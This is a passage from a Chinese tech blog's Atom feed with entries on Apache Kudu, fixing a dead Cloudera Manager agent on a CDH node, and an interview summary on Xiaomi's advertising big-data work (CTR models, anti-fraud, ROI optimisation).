多版本并发控制</h4><p>特点：对每一行都保存多个版本</p><p>能力：Snapshot读、历史读、增量备份、同一个Tablet内多行写的原子性</p><p>一个写操作的执行步骤</p><ul><li>leader收到写请求，获得要写的行锁</li><li>为写操作分配timestamp</li><li>通过raft协议备份写操作</li><li>真正对行数据做更改</li><li>更改timestamp为committed，对外可见</li></ul><h4 id="Flush过程"><a href="#Flush过程" class="headerlink" title="Flush过程"></a>Flush过程</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qmejsnxoj20ps0gyjvw.jpg" alt></p><h4 id="NoSQL-API"><a href="#NoSQL-API" class="headerlink" title="NoSQL API"></a>NoSQL API</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qmfkz0s5j20ka0g8n1g.jpg" alt></p><h4 id="Spark-DataFrame"><a href="#Spark-DataFrame" class="headerlink" title="Spark DataFrame"></a>Spark DataFrame</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qmfw0yk5j20mw0fy0xe.jpg" alt></p><h4 id="Kudu-RDD"><a href="#Kudu-RDD" class="headerlink" title="Kudu RDD"></a>Kudu RDD</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qmgt0qz2j20m80ggahx.jpg" alt></p><h4 id="SparkSQL-on-Kudu"><a href="#SparkSQL-on-Kudu" class="headerlink" title="SparkSQL on Kudu"></a>SparkSQL on Kudu</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qmi4uzcwj20jp0eftco.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qmijj52wj20jk0fan0z.jpg" alt></p><h4 id="实时数仓"><a href="#实时数仓" class="headerlink" title="实时数仓"></a>实时数仓</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qmjsnt5qj20ov0fdn05.jpg" alt></p><hr><h3 id="8-专业团队对Kudu的测试报告"><a href="#8-专业团队对Kudu的测试报告" class="headerlink" title="8. 专业团队对Kudu的测试报告"></a>8. 专业团队对Kudu的测试报告</h3><p><a href="https://sq.163yun.com/blog/article/174995941069086720" target="_blank" rel="noopener">【大数据之数据仓库】选型流水记</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Kudu&lt;/p&gt;
&lt;p&gt;一图以蔽之：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2ly1g2jmwis7z6j20cj0brgln.jpg&quot; alt=&quot;alt kudu&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Kudu" scheme="http://yoursite.com/categories/Hadoop/Kudu/"/>
    
    
      <category term="Kudu" scheme="http://yoursite.com/tags/Kudu/"/>
    
  </entry>
  
  <entry>
    <title>CDH集群代理状态问题</title>
    <link href="http://yoursite.com/2019/04/29/Cluster%20Error%20Record1/"/>
    <id>http://yoursite.com/2019/04/29/Cluster Error Record1/</id>
    <published>2019-04-29T09:27:12.000Z</published>
    <updated>2019-05-09T06:39:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>公司测试集群因为有好几个项目组的同事都在用，时不时会出一些问题</p><p>昨天下班前，集群报警</p><p>CDH中查看主机状态<br>datanode128出现：该主机与 Cloudera Manager Server 失去联系的时间过长。 该主机未与 Host Monitor 建立联系。</p><a id="more"></a> <p>运行状态检测出现问题：<br><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2jn7huhlvj20kg0n3wgi.jpg" alt="alt bug"></p><p>几乎所有组件处于警告状态，基本可以确定是交换内存的问题，如果内存足够大，可以直接取消交换内存</p><p>查看节点agent 状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@datanode128 ~]# /data2/CM/cm-5.13.3/etc/init.d/cloudera-scm-agent status</span><br><span class="line">cloudera-scm-agent 已死，但 pid 文件存在</span><br></pre></td></tr></table></figure><p>解决办法：删除了pid文件，重新增加节点，将swappiness设置为0（不能用VIM设置，用<code>sysctl -w vm.swappiness=0</code>），swappiness文件有一些特性，这边不展开。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;公司测试集群因为有好几个项目组的同事都在用，时不时会出一些问题&lt;/p&gt;
&lt;p&gt;昨天下班前，集群报警&lt;/p&gt;
&lt;p&gt;CDH中查看主机状态&lt;br&gt;datanode128出现：该主机与 Cloudera Manager Server 失去联系的时间过长。 该主机未与 Host Monitor 建立联系。&lt;/p&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="CDH" scheme="http://yoursite.com/categories/Hadoop/CDH/"/>
    
    
  </entry>
  
  <entry>
    <title>广告大数据在小米的实践</title>
    <link href="http://yoursite.com/2019/04/22/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%9C%A8%E5%B0%8F%E7%B1%B3%E7%9A%84%E5%AE%9E%E8%B7%B5/"/>
    <id>http://yoursite.com/2019/04/22/大数据在小米的实践/</id>
    <published>2019-04-22T13:45:12.000Z</published>
    <updated>2019-05-09T06:44:49.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文资料主要来自小米的小米商业产品部技术的总监接受媒体采访时的内容，内容主要是广告大数据技术在小米的实践梗概和自己的一些想法。</p></blockquote><p>宋强是时任小米商业产品部技术的总监，在采访中他喜欢将小米看成是一家大数据公司，因为小米强大的生态链，小米的大数据和其他公司相比，最大的特点和优势是“全生态、多样性”。</p><a id="more"></a> <p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2q8s2r5qdj20k008oabd.jpg" alt></p><h4 id="1-小米的实践经验"><a href="#1-小米的实践经验" class="headerlink" title="1.小米的实践经验"></a>1.小米的实践经验</h4><p>首先是<strong>广告营销</strong>，通过点击预估算法提升广告收入，通过营销DMP帮助广告主进行精准营销等等。其次，大数据在小米金融业务中也广泛应用，包括<strong>风控</strong>和<strong>征信分析</strong>、<strong>反欺诈</strong>等。在搜索和推荐业务中，大数据对各种算法的提升也起到了至关重要的作用，包括<strong>查询理解</strong>、<strong>相关性模型</strong>和<strong>点击预估</strong>等。</p><h4 id="2-发展趋势"><a href="#2-发展趋势" class="headerlink" title="2.发展趋势"></a>2.发展趋势</h4><p>智能化：算法智能化，随着ML和AI的进一步发展，大数据的价值将更加充分挖掘，其次是营销的智能化，通过<strong>多维立体的用户标签数据</strong>，从<strong>性别</strong>、<strong>年龄</strong>等基础数据，到<strong>APP使用频次</strong>和<strong>时长</strong>、<strong>运动轨迹</strong>、<strong>手机信号</strong>等数据形成的<strong>兴趣标签</strong>，再到精准的<strong>时间</strong>、<strong>位置</strong>、<strong>场景化</strong>标签，帮助广告主进行更加智能化的广告营销。</p><h4 id="3-广告大数据的应用场景"><a href="#3-广告大数据的应用场景" class="headerlink" title="3.广告大数据的应用场景"></a>3.广告大数据的应用场景</h4><p>首先是<strong>广告算法优化</strong>，包括<strong>点击率预估</strong>、<strong>反作弊</strong>、<strong>用户体验优化</strong>、<strong>广告主ROI优化</strong>等多个方向。其次是营销DMP，小米的营销DMP通过整合媒体、投放平台以及广告主的各方数据，使用大数据技术对用户的特征进行挖掘，为广告主提供了20多个维度、上百个标签的<strong>实时</strong>用户画像管理。</p><h4 id="4-广告平台架构"><a href="#4-广告平台架构" class="headerlink" title="4.广告平台架构"></a>4.广告平台架构</h4><p>整个系统架构包括接入层、服务层、算法层和存储层。接入层负责流量的接入、管理、配置和运营。服务层是广告检索的核心，包含广告选取、过滤、排序等核心逻辑，主要的服务有广告交易平台、效果和排期广告服务等。算法层负责点击率预估、预算平滑、精准定向等算法，存储层则是各种广告和用户数据访问层。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2q91453odj20k0094taz.jpg" alt></p><p>广告平台架构在演化过程中，主要思路：</p><p>架构为业务服务，每一次架构的迭代都是业务驱动的。我们的团队也是按照业务进行划分的，每个业务团队有明确的目标，通过目标驱动架构的微调和迭代，也许架构并不是完美的但却是最有效的。</p><p>其次，业务逻辑配置化+公共逻辑服务化，不同广告业务在产品形态、素材规格、竞价方式方面会有所不同，并且会随着时间不断变化，架构必须灵活来支持业务的变化和差异，通过资源管理平台对广告位进行的自动化管理，使得业务逻辑配置化。同时不同业务总是有一些共性需求，通过对公共逻辑的模块化和服务化， 减少耦合和重复建设，提高系统的稳定性和可靠性。</p><h4 id="5-小米的点击预估实践"><a href="#5-小米的点击预估实践" class="headerlink" title="5.小米的点击预估实践"></a>5.小米的点击预估实践</h4><p>点击预估是广告算法核心，大部分工作时间都在做做特征挖掘和模型优化。</p><p>特征挖掘更像是一门艺术，需要熟悉业务，更需要灵感。算法工程师每天的工作就是搜肠刮肚找出跟用户点击广告相关的信号。大部分可能是弱信号，组合起来才能发挥威力。模型则是兵器库，过去两年我们尝试了离线LR，在线FTRL，非线性模型FM和GBDT，以及正在实验中的深度模型等。</p><p>这里分别介绍应用分发、搜索和信息流广告的点击预估工作。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2q9eh2yfrj20js0br792.jpg" alt></p><h5 id="应用分发"><a href="#应用分发" class="headerlink" title="应用分发"></a>应用分发</h5><p>移动互联网发展到今天，应用推广仍然是效果广告主的首要诉求。依托于小米应用商店、浏览器和小米视频等app，应用分发成为了小米广告平台收入的重要组成部分，算法优化则是不断提升收入的利器。</p><p>特征工程方面，我们尝试了以下几大类的特征：用户特征（人口属性、系统信息等）、广告特征（id、类别、位置等）、用户行为特征（app历史安装、近期下载、近期使用等）、用户广告行为特征（广告的曝光、点击、下载等）、组合特征（用户特征X广告特征等）。其中，用户行为特征被证明为最有效，这也是和业务/产品形态最最密切相关的特征。模型方面，从最开始的LR到天级的FTRL，再到小时级的FTRL，效果逐步提升。</p><h5 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h5><p>这里的搜索指的也是应用搜索，主要依托于应用商店和浏览器庞大的搜索流量进行变现。在模型优化方面，最初的模型是一个纯文本相关性的模型，主要考虑搜索关键词和广告文本（包括app的名称、描述等）的相关性。接着我们尝试了行为相关性模型，主要是基于协同过滤的思想来计算两个app的相似性（item-based）。今年开始正式采用了点击率模型，收入也是取得了大幅度的增长。</p><p>特征工程方面，和应用分发类似，也是这么几大类的特征。需要重点highlight的是搜索上下文特征在搜索场景最有效，比如搜索关键词、搜索自然结果及分类、搜索来源等。</p><h5 id="信息流"><a href="#信息流" class="headerlink" title="信息流"></a>信息流</h5><p>信息流广告起源于Facebook，在国内多家平台取得成功（如今日头条，微博等），信息流的广告形式有大图、小图、组图等形式，广告类型包括应用分发、H5和视频等。竞价方式也是多种多样，CPC/CPD/CPM/CPT要啥有啥。小米信息流广告的主要载体是一点资讯和浏览器。</p><p>信息流广告的算法优化和应用分发类似，也有一些不同的地方。信息流广告的素材更新频繁，广告数量也比较多。反应到模型方面，<strong>小时级的FTRL模型比天级模型有大幅度的提升</strong>。</p><h4 id="6-小米是如何应用机器学习反作弊功能的"><a href="#6-小米是如何应用机器学习反作弊功能的" class="headerlink" title="6.小米是如何应用机器学习反作弊功能的"></a>6.小米是如何应用机器学习反作弊功能的</h4><p>首先，移动端的作弊和刷量现象非常严重。据统计，70%的推广渠道存在刷量作弊行为。移动端的作弊手段也是多种多样，主要表现在：</p><ul><li>刷机：通过特殊的刷机软件，篡改手机的环境参数，如IMEI/MAC等，模拟多用户下载、激活和使用。</li><li><p>模拟器：通过虚拟机软件（bluestacks，Virtual Box等）自动运行脚本，模拟用户点击、下载、激活、留存等数据。</p></li><li><p>程序化点击：通过雇佣或者劫持的方式，利用大量真实设备进行程序化的点击、下载、激活等。</p></li></ul><h5 id="反作弊技术的关键"><a href="#反作弊技术的关键" class="headerlink" title="反作弊技术的关键"></a>反作弊技术的关键</h5><p>设备真伪识别：</p><p>一般是通过SDK的方式采集硬件信息，为每台设备生成唯一的设备id，后续即使刷量者对设备的硬件信息进行修改，唯一的设备id也不会变。市场上有多家公司提供了类似的解决方案。比如数盟、量江湖、maxent等。小米与其中几家公司有紧密的合作，并且自己也开发了一套基于硬件标识的设备真伪识别方案。<br>用户行为分析：</p><p>不管是哪种作弊手段，都是有规律可循的，通过大数据分析和机器学习一定能找到蛛丝马迹（正所谓“魔高一尺，道高一丈”，“天网恢恢，疏而不漏”……）。比如用户IP分布异常、机型分布异常、点击率异常、下载激活时间间隔异常、留存率和使用时长异常等等。作弊的仿真度越高，异常特征就越不明显，对应的反作弊技术和代价也就越高。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qb20unmyj20is0c1gp0.jpg" alt></p><p>客户端：核心模块是反作弊SDK，通过采集系统信息生成设备唯一id，用于机器真伪识别。另外采集其他必要的信息用于服务端的反作弊模型分析。服务端：有两套反作弊系统，实时和离线反作弊。实时反作弊系统收集实时上报的日志，通过实时流计算框架，快速分析作弊情况，一般用于捕捉短期的作弊行为。离线反作弊则是通过收集多维度的数据，经过离线计算和反作弊模型，最大限度发现各种长期和短期的作弊行为。不管是实时还是离线反作弊，都牵涉三个模块：数据收集：设备id，IP，广告点击/下载/激活时间戳等信息特征计算：多维度（如IP、UserAgent等）、多粒度（周、天、小时、分钟）、多指标（CTR、下载数、时间间隔等）的实时/离线计算反作弊模型：分为实时和离线模型实时模型：主要是基于规则的模型离线模型：目前主要也是基于规则的模型，未来会尝试用机器学习模型（比如LR，DNN等）前端：主要提供数据报表、异常监控、智能分析等功能，不展开讲。</p><h4 id="7-广告大数据如何为用户优化体验"><a href="#7-广告大数据如何为用户优化体验" class="headerlink" title="7.广告大数据如何为用户优化体验"></a>7.广告大数据如何为用户优化体验</h4><p>用户体验优化的目标是减少广告展示来提升用户体验，这里有两个问题需要解决：用户体验的指标是什么？如何平衡广告收入和用户体验？对于用户体验，不同的产品有不同的定义：下滑率，搜索次数，页面点击率等等。为了简化优化目标，我们挑选了几个对大部分产品都饲用的指标：主要指标是留存率和日货率，次要致表示使用次数和时长。</p><p>用户体验模型综合考虑了几个方面的因素来决定广告最终是否展现给用户：首先是广告质量分模型。最简单的质量分模型只考虑广告效果，比如CTR，RankScore（综合考虑CTR/CVR和出价的广告排序分数）等。基于这些数据可以做简单的“断尾计划”（也就是对于CTR或者RankScore做一个阈值控制）。这种方案实现简单，但效果一般。目前我们正在实验用户容忍度模型和用户影响力模型，以后有机会再展开来讲。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qeo7rlnjj20ms08v0tr.jpg" alt></p><p>分桶测试把流量切分成3大块，用来收集不同的用户体验方案对于收入和用户体验的影响。先来看一下某app“无广告”vs“有广告”的A/B测试结果，结论：广告对用户体验有一定影响的（~3%）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qewqrtpsj20i506bq46.jpg" alt></p><p>用户体验模型综合考虑了几个方面的因素来决定广告最终是否展现给用户：广告质量分模型：最简单的质量分模型只考虑广告效果，比如CTR，RankScore（综合考虑CTR/CVR和出价的广告排序分数）等。基于这些数据可以做简单的“断尾计划”（也就是对于CTR或者RankScore做一个阈值控制）。这种方案实现简单，但效果一般。下图是基于RankScore的“断尾”实验结果，对收入影响比较大：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qex347d4j20ih0cadhg.jpg" alt></p><p>用户容忍度模型和用户影响力模型：目前还处于实验阶段，先不细讲了。</p><h4 id="8-为了获取真实可用的数据从而提升收益，小米提出了广告主ROI算法模型。对此模型的简单介绍。"><a href="#8-为了获取真实可用的数据从而提升收益，小米提出了广告主ROI算法模型。对此模型的简单介绍。" class="headerlink" title="8.为了获取真实可用的数据从而提升收益，小米提出了广告主ROI算法模型。对此模型的简单介绍。"></a>8.为了获取真实可用的数据从而提升收益，小米提出了广告主ROI算法模型。对此模型的简单介绍。</h4><p>点击预估模型的优化目标是eCPM和收入，但是广告主的投放目标是ROI，两个目标是不完全一致的。另外，不同的广告主对于R的定义也不一样，有的是激活/留存（新闻资讯），有的是用户注册（金融理财），有的是下单/消费（电商购物）。</p><p>广告主ROI优化牵涉两方面的工作：<strong>数据收集和模型优化</strong>。</p><p>数据收集：广告数据的完整生命周期包括曝光、点击、下载、激活、留存、注册、消费等。其中曝光/点击/下载是发生在流量方的数据，可以很容易获取并用于点击预估模型，提升广告收入。激活和留存是广告主app的使用数据，通过MIUI系统可以获取。注册和消费则是广告主app内部使用数据，很难通过系统的方式获取，需要和广告主进行数据合作。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qeqtblfyj20kl0530tv.jpg" alt></p><p>模型优化：以激活率模型为例，可以结合CTR模型进行，通过激活数据修改CTR模型的正样本来调整点击预估结果。也可以单独训练激活率模型，然后在广告排序中同时考虑CTR和CVR。</p><p>曝光、点击、下载：发生在流量方的数据，可以很容易获取并用于点击预估模型，提升广告收入。<br>激活和留存：广告主app的使用数据，通过MIUI系统可以获取。<br>注册和消费：广告主app内部使用数据，很难通过系统的方式获取，需要和广告主进行数据合作。</p><p>广告主ROI算法模型（以激活数据为例）<br>样本修正：修改CTR模型正样本，下载得分1，激活得分k(k&gt;1)，然后按得分复制正样本个数<br>阈值控制：单独训练激活率模型，设定阈值p，当激活率低于阈值时，不参与竞价<br>组合模型：单独训练激活率模型，然后修正CTR，CTR<em>Price=&gt;CTR</em>(1+AR^λ)*Price  </p><h4 id="9-总结"><a href="#9-总结" class="headerlink" title="9.总结"></a>9.总结</h4><p>我们的算法团队在过去将近两年的时间里，从点击预估开始，逐步拓展到反作弊、用户体验优化、广告主ROI优化、智能出价、预算平滑等方向。取得了一些成绩，也踩过了很多坑。由于人力有限，我们的算法工作绝大部分时间都是在<strong>特征工程和模型优化</strong>两方面，我这里就围绕这两块做一些经验总结：</p><p><strong>特征工程：</strong></p><p>业务相关的用户行为特征一般来说最有效<br>用户在商店的安装列表 vs 用户的年龄性别，前者更有效<br>保持数据的“原汁原味”，二次加工反而容易丢失信息<br>用户浏览记录 vs 用户画像兴趣标签，前者更有效<br>组合特征才能发挥最大威力</p><p><strong>模型优化：</strong></p><p>线性模型+组合特征效果很好<br>离线实验了FM等非线性模型，效果不明显<br>线性模型+深度模型是未来的方向<br>正在线下实验，已经看到一些效果</p><hr><p>这边依旧留下一个偶然看到的问题，是关于网站的幂等问题</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文资料主要来自小米的小米商业产品部技术的总监接受媒体采访时的内容，内容主要是广告大数据技术在小米的实践梗概和自己的一些想法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;宋强是时任小米商业产品部技术的总监，在采访中他喜欢将小米看成是一家大数据公司，因为小米强大的生态链，小米的大数据和其他公司相比，最大的特点和优势是“全生态、多样性”。&lt;/p&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Picks" scheme="http://yoursite.com/categories/Hadoop/Picks/"/>
    
    
      <category term="Picks" scheme="http://yoursite.com/tags/Picks/"/>
    
  </entry>
  
</feed>
